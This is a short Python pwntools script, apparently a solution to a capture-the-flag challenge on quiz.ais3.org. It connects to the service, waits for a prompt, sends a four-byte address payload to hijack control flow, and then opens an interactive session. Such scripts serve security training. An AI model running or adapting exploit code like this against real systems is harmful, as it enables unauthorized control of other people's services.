#!/usr/bin/env python

from pwn import *

# host = '127.0.0.1'
# port = 8888
host = 'quiz.ais3.org'
port = 9561

r = remote(host, port)

raw_input('#')
r.recvuntil(': ')

payload = '\x13\x86\x04\x08'

r.sendline(payload)
r.interactive()
